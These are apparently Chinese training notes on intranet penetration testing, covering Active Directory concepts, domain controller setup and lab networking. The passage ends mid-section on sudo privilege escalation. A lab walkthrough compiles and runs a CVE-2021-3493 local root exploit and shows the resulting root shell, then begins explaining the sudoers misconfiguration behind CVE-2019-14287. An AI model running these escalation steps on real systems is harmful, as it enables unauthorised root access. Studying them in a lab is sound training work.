# 前置补充：域

## 1. 域的简单介绍

**1.1 内网环境**

1）工作组：默认模式，人人平等，不方便管理

2）域：人人平等，集中管理，统一管理

**1.2 域的组成**

+ 域控制器（Domain Controller）
+ 成员机

## 2. 安装域

# [Windows Server 2012 域控搭建](https://www.cnblogs.com/xiaozi/p/12828421.html)

 

0x01 准备

1、设置固定ip地址

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504212825308-382274516.png)

 

 2、修改计算机名

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504212949129-863923712.png)

 

 3、立即重新启动

 

0x02 安装AD

1、管理--添加角色和功能

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504213127196-698468382.png)

2、添加角色和功能向导，直接点击下一步

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504213202890-1228069354.png)

 

3、添加角色和功能向导，基于角色或基于功能的安装，下一步。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504213259356-138295861.png)

 

4、从服务器池中选择服务器，下一步。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504213401197-1440845936.png)

 

5、选择“Active Direcyoty 域服务”，下一步。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504213539038-1124267461.png)

 

6、根据服务器需要，选择功能组件，可先不选择，后续根据需要再添加也可以。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504213635647-256067043.png)

 

 7、查看相关注意事项，下一步

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504213737673-1446134457.png)

 

8、确认安装所选内容，开始安装。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504213823186-975652757.png)

 

 9、安装成功。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504214349015-1405231998.png)

 

 

0x03 域控服务器配置

1、部署后配置，将此服务器提升为域控制器

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504214502996-308117590.png)

 

2、为了与.com分开，测试环境使用.local后缀

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504214648498-1139789900.png)

 

 3、设置DSRM密码，下一步

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504214741418-527395722.png)

 

 4、会报错，没安装DNS服务器，直接下一步

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504214846425-1729786743.png)

 

 5、设置NetBIOS域名，下一步

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504214949269-1125047193.png)

 

 6、设置相关路径，下一步。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504215028188-184235996.png)

 

 7、确认域服务器配置

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504215054416-60440493.png)

 

 8、先决条件检查。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504215123576-2032436613.png)

 

 9、先决条件检查完成，开始安装，安装完会自动重启

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504215154459-1129573529.png)

0x04 检查安装是否成功

1、检查服务器管理器面板，确认DC搭建完成。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504215724569-1470183949.png)

 

 

0x05 加入域并创建域用户

1、客户端服务器设置固定ip，并将域控服务器IP地址设置为DNS服务器地址。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504220805529-156221351.png)

 

2、加入域控，输入域管理员凭证的对话框，成功入域。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504222450705-1661109634.png)

 

3、域控制器上打开“Active Directory 用户和计算机”，如下图所示，可以发现的新入域的服务器已经被创建出来了。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504222544937-1177339344.png)

4、加入域后，我们需要在 Active Directory 中创建关联的用户账号。打开 Active Directory 用户和计算机，选择新建组织单位。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504222804220-1436475035.png)

 

5、在新创建的组织单位中，创建新用户。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/894761-20200504223007184-400866145.png)





# 第一章 内网安全基础知识

## 1-1 什么秘密是内网和外网

内网和外网有多种分类方法，内网可叫局域网，外网可叫广域网。也可以以私有IP和公有IP做划分

## 1-2 安全域划分

安全域划分的目的是：将拥有相同安全等级的计算机啊划分到同一网络内，拥有相同的网络边界，在边界上使用防火墙等安全设备部署网络策略（ACL）

### 安全域划分

通常防火墙会划分处5个区域

+ `untrust`不信任域：通常是外网（0）
+ `DMZ`隔离区域：通常是允许外部网络访问的服务器放在该区域（50）
+ `trust`信任区域：通常是内网（85）
+ `local`本地区域：防火墙本身（100）
+ `mmanageent`管理区域：管理防火墙的区域（100）

## 1-3 ATT&CK 框架

> 官网学习：https://attack.mitre.org/matrices/enterprise/
>
> 陈鑫杰B站：https://www.bilibili.com/video/BV1EV41117UJ/?spm_id_from=333.337.search-card.all.click&vd_source=05abd235c4d932713bb7910dfa6ba067

## 1-4  什么是工作组

优先：在同一个局域网内，所有的计算机都被列在**网上邻居**中，但随着局域网的规模扩大，就需要以分组的形式来对计算机做划分，以便用户更好的访问到目标计算机。计算机通过工作组进行分类，使我们访问的资源结构化更强。工作组情况下资源可以一定随机和灵活的分布，更方便资源共享，管理员只需要实施简单的维护。

缺点：缺乏集中管理与控制的机制，没有集中的统一帐户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性严密控制。只适合小规模用户的使用。

## 1-4 域

### 域环境基础概念

+ 组织单元OU：组织单元（Organizational Unit，OU）是一个**容器**，用于归类域资源，如：用户，计算机，工作组，打印机。并为其设置安全策略
  + 创建**技术部**组织单元：
  + <img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231030230122592.png" alt="image-20231030230122592" style="zoom:50%;" /><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231030230131646.png" alt="image-20231030230131646" style="zoom:50%;" />
  + 将跟技术部相关的用户和计算机都移动到技术部的组织单元中
  + ![image-20231030230238576](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231030230238576.png)

+ 组策略GPO Group Policy ：通过组策略可以修改计算机的各种属性，如开始菜单、桌面背景、网络参数等
  + 组策略在域中，是基于OU来下发的
  + 创建组策略：
  + ![image-20231030232838835](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231030232838835.png)


+ 安全标识符SID：用于**标识安全主体的唯一值**，安全主体可以是：用户账户、计算机账户等。系统可以通过SID来判断主体的权限情况（s-1-5-21-D1-D2-D3-RID）
+ 域是一个有安全边界的集合，同一个域中的计算机彼此之间建立信任关系，计算机之间允许互相访问。
+ 单域环境中只使用一个DNS名字空间，例如book.com。域中的所有计算机账户和用户账户都是用同一个域后缀（DNS名称后缀）。

## 1-5 活动目录 AD

获得目录存储的是网络中所有资源的快捷方式，用户通过快捷方式来定位相应的资源；在一个域中，所有目录共享一个获得目录

获得目录特点：

1. 集中管理：管理员可以集中管理网络
2. 便携的网络资源访问：活动目录允许用户一次登录网络，就可以访问所有用户有权限访问的资源。并且不需要知道资源存储的物理位置
3. 可扩展性：目录可以随组织规模的扩展而扩展

## 1-6 DC于GC

DC 域控制器：在域中拥有最高权限，可用于管理整个域中的所有计算机

GC 全局编录：包含森林中所有对象信息的特殊目录数据库。全局编录是存储林中所有 Active Directory 对象的副本的域控制器。全局编录存储林中主持域的目录中所有对象的完全副本，以及林中所有其他域中所有对象的部分副本。全局编录中包含的所有域对象的部分副本是用户搜索操作中最常使用的部分。作为其架构定义的一部分，这些属性被标记为包含到全局编录中。在全局编录中存储所有域对象的最常搜索的属性，可以为用户提供高效的搜索，而不会以不必要的域控制器参考影响网络性能。在林中的初始域控制器上，会自动创建全局编录。可以向其他域控制器添加全局编录功能，或者将全局编录的默认位置更改到另一个域控制器上。



## 1-7 域、域树、域林 、林根介绍

域、域树、域林都是活动目录 (Active Directory)的逻辑单元。

- 域：域是一种管理单元，也是一个管理边界，在同一个域内共享某些功能和参数。一个域可以有多台域控制器。
- 域树：共用一个连续的域名的windows域，比如：zpchcbd.com，a.zpchcbd.com，b.zpchcbd.com 这三个在同一个 域树 上，同时zpchcbd.com则被称为 树的根域 ，然后a.zpchcbd.com , b.zpchcbd.com 则被成为 子域 。
- 域林：域林是一个或多个不连续DNS名的域 (树)的集合。
- 林跟：在林中创建的第一个域控为林根，也可以叫做根域
- ![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/%E5%9B%BE%E7%89%87140.png)

## 1-8 DNS在域中的重要性

在实际业务中，域控制器和DNS服务器都会配置在同一台计算机上，所以在实际的渗透测试中，我们可以通过寻找DNS服务器来定位域控制器

DNS 在Windows域环境中的重要性介绍

1. 名称解析：DNS用于将计算机名转换为IP地址，以便在网络上定位和访问其他计算机。在Windows域环境中，DNS是用于名称解析的主要机制，它可以帮助客户端找到域内其他计算机的IP地址，从而进行通信和数据交换。

2. 域控制器发现：在Windows域环境中，域控制器是管理域中用户、计算机和资源的核心组件。客户端需要知道域控制器的名称和IP地址才能登录到域中，DNS提供了这些信息。域控制器在安装时会将自己的DNS信息注册到DNS服务器上，客户端可以通过DNS查询找到域控制器的信息。

3. 动态更新：在Windows域环境中，DNS还支持动态DNS更新。当新计算机加入域时，它会将自己的DNS信息注册到DNS服务器上，以便其他计算机可以找到它。同样地，当计算机离开域时，它会将自己的DNS信息从DNS服务器上删除。这样可以保持DNS信息的最新状态，从而减少错误和故障。

4. Active Directory集成：在Windows域环境中，DNS与Active Directory密切集成。域控制器和其他Windows服务器使用DNS来定位Active Directory中的服务和资源。例如，在域中查找用户、组和计算机时，Active Directory使用DNS来查找它们的位置。

   

## 1-9 域功能基础概念

- 功能级别：功能级别定义了域或林中可以使用的高级功能。不同版本的Windows Server支持不同的功能级别。提高功能级别可以启用新功能，但会限制可以加入域或林的域控制器的操作系统版本。**高功能级别普遍可以低兼容低安全级别，但是低安全级别无法兼容高功能级别**

- 信任关系：信任关系是在两个域或林之间建立的，允许一个域中的用户使用另一个域中的资源。信任关系可以是单向的或双向的，并且可以是显式创建的或隐式创建的（例如父子域之间的信任关系）。

- 全局编录服务器：全局编录服务器是存储林中所有Active Directory对象副本的域控制器。它包含了林中所有对象信息的特殊目录数据库。全局编录存储林中主持域的目录中所有对象的完全副本，以及林中所有其他域中所有对象的部分副本。

- 只读域控制器：只读域控制器（RODC）是一种特殊类型的域控制器，它存储Active Directory数据库的只读副本。RODC通常用于安全性较低或物理安全性无法保证的位置，因为它不存储用户凭据，因此即使被攻击也不会泄露敏感信息。

  
  
  

## 1-10 **FSMO角色功能**

+ 架构主机：控制活动目录整个林中所有对象和属性的定义，具有架构主机角色的DC是可以更新目录架构的唯一DC。这些架构更新会从架构主机复制到目录林中的所有其它域控制器中。 架构主机是基于目录林的，整个目录林中只有一个架构主机。

+ 域命令主机：向目录林中添加新域。从目录林中删除现有的域。添加或删除描述外部目录的交叉引用对象。

+ PDC模拟器：向后兼容低级客户端和服务器，担任NT系统中PDC角色时间同步服务源，作为本域权威时间服务器，为本域中其它DC以及客户机提供时间同步服务，林中根域的PDC模拟器又为其它域PDC模拟器提供时间同步!密码最终验证服务器，当一用户在本地DC登录，而本地DC验证本地用户输入密码无效时，本地DC会查询PDC模拟器，询问密码是否正确。

+ 主机角色：RID主机：分配SID，SID由域SID+序列号组合而成，后者称为“相对ID”(Relative ID,RID),在Win2003环境中，为保证整个域中每个DC所创建的安全主体对应的SID在整个域范围唯一性，设立该主机角色，负责向其它DC分配RID池(默认一次性分配512个)，所有非RID在创建安全实体时，都从分配给的RID池中分配RID，以保证SID不会发生冲突!

+ 基础架构主机：基础结构主机的作用是负责对跨域对象引用进行更新，以确保所有域间操作对象的一致性。基础架构主机工作机制是定期会对没有保存在本机的引用对象信息，而对于GC来说，会保存当前林中所有对象信息。

  

## 1-11 操作主机故障影响

操作主机在Active Directory环境中，肩负着重要的作用，如果操作主机出现问题，将会出现以下问题：

当架构主机不可用时，不能对架构进行更改。在大多数网络环境中，对架构更改的频率很低，并且应提前进行规划，以便使架构主机的故障不至于产生任何直接的问题。

当域命名主机不可用时，不能通过运行DCPROMO向Active Directory中添加域，同时也不能从目录林中删除域，如果在域命名主机不可用时试图通过运行DCPROMO来删除域，那么就会收到一条"RPC 服务器不可用"的消息。

当RID主机不可用时，所遇到的主要问题是不能向域中添加任何新的安全对象，例如用户、组和计算机；如果试图添加，则会出现如下的错误消息："Windows 不能创建对象，因为：目录服务已经用完了相对标识号池"。

当PDC主机不可用时，在本机模式环境中用户登录失败的可能性增大。如果重新设置用户密码，例如用户忘记密码，然后管理员在一台DC（不是验证DC）上重新设置密码，那么该用户就必须等到密码复制到验证DC之后才能登录。试图编辑组策略对象时出错。

当基础架构主机不可用时，结构主机故障对环境的影响是有限的。最终用户并不能感觉到它的影响，只对管理员执行大量组操作产生影响。这些组操作通常是添加用户和/或重新命名用户。在此情况下，结构主机故障只是会延迟通过Active Directory管理单元引用这些更改的时间。



## 1-12 只读域控制服务器

只读域控制器（RODC）是Windows Server 2008 AD DS域服务之后提供的新域控制器类型，只读域控制器同样是域控制器，但是Active Directory数据具备“只读”属性，只能读取不能写入。只读域控制器主要用在企业分支机构

管理员不能直接对 RODC 进行更改，要修改数据，必须先修改域控制服务器，再将数据复制到只读域控制服务器中



### RODC 优点

1. 只读的 Active Directory 数据库

2. 单向复制：数据只能从 DC 复制到 RODC

3. 密码缓存

4. 只读DNS

5. RODC管理：RODC允许一个普通的域用户称为RODC管理员

6. GC支持：RODC可以做GC（全局编录）服务器，但是RODC不能安装操作主控角色。

   

### RODC 缺点

对可读写的域控制器有很明显的依赖性！如果域控制器出错，那么RODC基本也会跟着出错



## 1-13 活动目录数据库

Active Directory数据库是一个事务处理数据库系统，通过日志文件支持**回滚操作**，从而确保事务提交到数据库中，与Active Directory 关联的文件包括：

1. Ntfs.dit，Active Directory数据库文件：对数据进行任何更改都会首先写道当前日志文件中，然后入Active Directory 数据库文件；日志大小是固定10MB

2. Edgxxx.log，事务日志文件：对数据库进行操作后，会将操作写入Edb.log文件中，当Edb.log文件充满事务之后，被重新命名为Edbxxxxx.log。（从00001开始，并使用十六进制累加）

3. Res1.log和Res2.log，预留的日志文件，确保在此驱动器上预留最后的20MB磁盘空间，以确保日志文件有足够的空间写入

4. Edb.chk，检查点文件：Edb.chk是数据库检查点文件，检查点是标识数据库引擎需要重复播放日志的点，通常在恢复或初始化时验证数据库的一致性

5. Temp.edb，临时数据库维护文件：数据库维护时使用的临时文件，用于存储当前进程中处理的信息。

6. Edbtmp.log，日志暂存文件：当前日志文件（Edb.log）填满时的暂时日志填充文件

   附：默认状态下，活动目录数据库文件位于“C:\Windows\NTDS”目录中。

# 第二章：域环境搭建

### 编辑虚拟网络编辑器

按下面图示添加网络和更改IP地址，之后正常开机即可，如果win-2016无法上网，重启一下就好

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20230517150428199.png" alt="image-20230517150428199" style="zoom:50%;" />

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20230517150440731.png" alt="image-20230517150440731" style="zoom:50%;" />

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20230517150450361.png" alt="image-20230517150450361" style="zoom:50%;" />

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20230517150457255.png" alt="image-20230517150457255" style="zoom:50%;" />

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20230517150505065.png" alt="image-20230517150505065" style="zoom:50%;" />

# 第三章：权限提示技术

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.png" alt="03-权限提升" style="zoom:50%;" />

## 1. Linux 内核切换与CVE-2021-3493

### 1.1 ubantu内核切换 操作主机：Ubantu 2004

```bash
# 查看当前内核版本
lonelyor@ubuntusrv2004:~$ uname -r
4.4.0-21-generic

# 查看已安装内核版本
lonelyor@ubuntusrv2004:~$ dpkg --get-selections | grep linux-image
linux-image-4.15.0-91-generic                   install
linux-image-4.4.0-21-generic                    install
linux-image-5.4.0-105-generic                   install
linux-image-unsigned-4.18.0-041800-generic      install

# 查看当前可安装的内核版本
lonelyor@ubuntusrv2004:~$ apt-cache search linux | grep linux-image
linux-image-4.4.0-21-generic - Linux kernel image for version 4.4.0 on 64 bit x86 SMP
linux-image-4.4.0-21-lowlatency - Linux kernel image for version 4.4.0 on 64 bit x86 SMP
linux-image-extra-4.4.0-21-generic - Linux kernel extra modules for version 4.4.0 on 64 bit x86 SMP
.......

# 安装需要的内核版本
lonelyor@ubuntusrv2004:~$ apt-cache search linux | grep linux-image linux-image-4.4.0-21-generic

# 查看内核启动顺序
lonelyor@ubuntusrv2004:~$ cat /boot/grub/grub.cfg | grep menuentry
if [ x"${feature_menuentry_id}" = xy ]; then
  menuentry_id_option="--id"
  menuentry_id_option=""
export menuentry_id_option
menuentry 'Ubuntu' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-4418d962-00a0-48ed-baf2-c968984c67b7' {
submenu 'Advanced options for Ubuntu' $menuentry_id_option 'gnulinux-advanced-4418d962-00a0-48ed-baf2-c968984c67b7' {
        menuentry 'Ubuntu, with Linux 5.4.0-105-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-105-generic-advanced-4418d962-00a0-48ed-baf2-c968984c67b7' {
        menuentry 'Ubuntu, with Linux 5.4.0-105-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-105-generic-recovery-4418d962-00a0-48ed-baf2-c968984c67b7' {
        menuentry 'Ubuntu, with Linux 4.18.0-041800-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-4.18.0-041800-generic-advanced-4418d962-00a0-48ed-baf2-c968984c67b7' {
        menuentry 'Ubuntu, with Linux 4.18.0-041800-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-4.18.0-041800-generic-recovery-4418d962-00a0-48ed-baf2-c968984c67b7' {
        menuentry 'Ubuntu, with Linux 4.15.0-91-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-4.15.0-91-generic-advanced-4418d962-00a0-48ed-baf2-c968984c67b7' {
        menuentry 'Ubuntu, with Linux 4.15.0-91-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-4.15.0-91-generic-recovery-4418d962-00a0-48ed-baf2-c968984c67b7' {
        menuentry 'Ubuntu, with Linux 4.4.0-21-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-4.4.0-21-generic-advanced-4418d962-00a0-48ed-baf2-c968984c67b7' {
        menuentry 'Ubuntu, with Linux 4.4.0-21-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-4.4.0-21-generic-recovery-4418d962-00a0-48ed-baf2-c968984c67b7' {

# 修改内核启动顺序
lonelyor@ubuntusrv2004:~$ nano /etc/default/grub
#GRUB_DEFAULT="Advanced options for Ubuntu>Ubuntu, with Linux 5.4.0-105-generic"
#GRUB_DEFAULT="Advanced options for Ubuntu>Ubuntu, with Linux 4.4.0-21-generic"
GRUB_DEFAULT="Advanced options for Ubuntu>Ubuntu, with Linux 4.15.0-91-generic"

# 更新启动项
lonelyor@ubuntusrv2004:~$ update-grub

# 重启服务器
lonelyor@ubuntusrv2004:~$ sudo reboot
```

###  1.2 CVE-2021-3493 提权

CVE-2021-3493 是一个 Ubuntu 特定的问题，它在 Ubuntu 中没有正确验证关于用户名称空间的文件系统功能的应用程序。由于 Ubuntu 带有一个支持非特权的 overlayfs 挂载的补丁，因此本地攻击者可以使用它来进行提权操作

受影响的版本包括：

- Ubuntu 20.10
- Ubuntu 20.04 LTS
- Ubuntu 18.04 LTS
- Ubuntu 16.04 LTS
- Ubuntu 14.04 ESM

```bash
# 查看系统版本以分辨是否属于受影响的版本
lonelyor@ubuntusrv2004:~/CVE-2021-3493$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.04 LTS
Release:        20.04
Codename:       focal
```

**POC代码渗透过程**

```bash
# EXP代码已经在 ubantu2004 home 目录下
lonelyor@ubuntusrv2004:~$ ls
CVE-2016-5195  CVE-2019-14287  CVE-2021-3156  CVE-2021-3493  CVE-2021-4034  linux-image  tmp

# 进入相应的文件夹
lonelyor@ubuntusrv2004:~$ cd  CVE-2021-3493
lonelyor@ubuntusrv2004:~/CVE-2021-3493$ ls
exploit  exploit.c  ovlcap  README.md

# 对EXP代码进行预编译
lonelyor@ubuntusrv2004:~/CVE-2021-3493$ gcc exploit.c

# 运行EXP代码
lonelyor@ubuntusrv2004:~/CVE-2021-3493$ ./exploit

# 提权成功！升级为root用户
bash-5.0# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(lonelyor)

```

## 2. CVE-2019-14287：利用sudo提权复现

### 2.1 漏洞原理

这个漏洞是由于管理员不规范的配置了`/etc/sudoers`文件造成的！

受影响版本：Sudo版本 < 1.8.28

sudo命令在不指定用户的情况下，默认使用`root`身份执行命令

**触发条件**

1. Sudo版本 < 1.8.28
2. `/etc/sudoers`错误配置

#### 2.1.1 sudoers文件配置

`sudoers`文件是用于定义哪些用户或用户组可以运行哪些命令的配置文件。它的通用格式如下

```
user host=(run_as) command
```

各部分的含义如下：

- `user`：一位或几位用户。在`/etc/group`中可以用一个`%`代替它，组对象的名称一定要用百分号`%`开头
- `host`：允许用户从哪些地方连接到这台主机。Linux作为服务器，管理员是有可能从别的主机远程连接过来的
- `run_as`：允许切换的身份
- `command`：允许执行的命令

默认情况下，系统都会自带一条允许`root`用户使用任意命令：

```bash
root    ALL=(ALL:ALL) ALL
```

#### 2.2.2 sudo命令使用

